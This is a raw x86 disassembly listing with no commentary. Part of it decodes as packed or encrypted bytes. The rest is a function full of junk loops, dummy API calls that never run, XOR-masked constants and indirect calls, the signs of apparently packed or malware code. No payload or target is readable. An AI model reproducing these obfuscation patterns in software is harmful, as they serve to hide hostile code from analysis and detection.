  414d33:	sbb    dh,BYTE PTR [eax-0x3d734d7b]
  414d39:	js     0x414cc4
  414d3b:	mov    gs,WORD PTR [edi-0x62cbc629]
  414d41:	dec    ebp
  414d42:	xchg   ecx,eax
  414d43:	mov    dl,0x9c
  414d45:	imul   ebx,DWORD PTR [esi+0x23],0xffffffdf
  414d49:	jge    0x414cf7
  414d4b:	fmul   QWORD PTR ds:0x51154593
  414d51:	jl     0x414dac
  414d53:	xor    edi,DWORD PTR [ecx+0x6792cb2e]
  414d59:	xchg   BYTE PTR [ebx+0x71],al
  414d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d5d:	pop    es
  414d5e:	cmp    al,0xcd
  414d60:	cmc    
  414d61:	and    ch,ch
  414d63:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414d65:	mov    dh,0x3d
  414d67:	add    DWORD PTR [esi],esp
  414d69:	inc    ecx
  414d6a:	mov    eax,DWORD PTR [edi]
  414d6c:	mov    DWORD PTR [edx-0x1b0f5b8b],ebp
  414d72:	push   esi
  414d73:	jmp    0x5f95c1da
  414d78:	pop    ds
  414d79:	jo     0x414d79
  414d7b:	loope  0x414d73
  414d7d:	and    eax,0xc831b523
  414d82:	jo     0x414d42
  414d84:	frstor [ebx]
  414d86:	or     BYTE PTR [ebp*8-0x5ff64b76],bl
  414d8d:	out    0x72,eax
  414d8f:	dec    esi
  414d90:	mov    dh,0x8d
  414d92:	lahf   
  414d93:	xchg   edi,eax
  414d94:	jecxz  0x414d2e
  414d96:	mov    esp,DWORD PTR [ebx-0x5ada03c8]
  414d9c:	jo     0x414e06
  414d9e:	mov    ch,0x78
  414da0:	(bad)  
  414da1:	dec    esp
  414da2:	mov    esp,0x3b33c4f
  414da7:	add    DWORD PTR [ebp-0x1f],ebx
  414daa:	dec    ecx
  414dab:	call   0xb9b1:0x5427bda9
  414db2:	and    DWORD PTR [eax],ebx
  414db4:	ret    0xc1bb
  414db7:	dec    edi
  414db8:	inc    ebx
  414db9:	cmp    eax,0x34f27c65
  414dbe:	and    DWORD PTR [edx+0x5d],0x5b
  414dc2:	or     eax,0x21c82282
  414dc7:	jg     0x414da0
  414dc9:	hlt    
  414dca:	shr    BYTE PTR [esp],cl
  414dcd:	cs inc ebx
  414dcf:	outs   dx,BYTE PTR ds:[esi]
  414dd0:	fs sahf 
  414dd2:	cdq    
  414dd3:	cmp    BYTE PTR [ebp-0x5d2b464e],cl
  414dd9:	loope  0x414d94
  414ddb:	cli    
  414ddc:	imul   esi,DWORD PTR [eax],0x63
  414ddf:	and    al,0x80
  414de1:	jns    0x414dc0
  414de3:	int    0xeb
  414de5:	xchg   BYTE PTR [ebp-0x6d],dl
  414de8:	adc    esi,DWORD PTR [ebx+0x2a57b3db]
  414dee:	(bad)  
  414def:	das    
  414df0:	push   es
  414df1:	mov    WORD PTR [ebp+0x863fb22],?
  414df7:	adc    eax,0x48e64ad5
  414dfc:	cs push bp
  414dff:	push   cs
  414e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e01:	push   esi
  414e02:	lods   eax,DWORD PTR ds:[esi]
  414e03:	mov    esi,0xed036c37
  414e08:	mov    ebx,0xc2638998
  414e0d:	out    dx,al
  414e0e:	pop    ecx
  414e0f:	push   es
  414e10:	sbb    al,0x16
  414e12:	push   eax
  414e13:	mov    ss,WORD PTR [ecx-0x57]
  414e16:	repnz repz push ds
  414e19:	aam    0xe2
  414e1b:	fnstenv [eax-0x35]
  414e1e:	mov    ebp,0x12236398
  414e23:	addr16 dec ebx
  414e25:	pop    esi
  414e26:	mov    ebp,0x66860fd1
  414e2b:	lods   al,BYTE PTR ds:[esi]
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
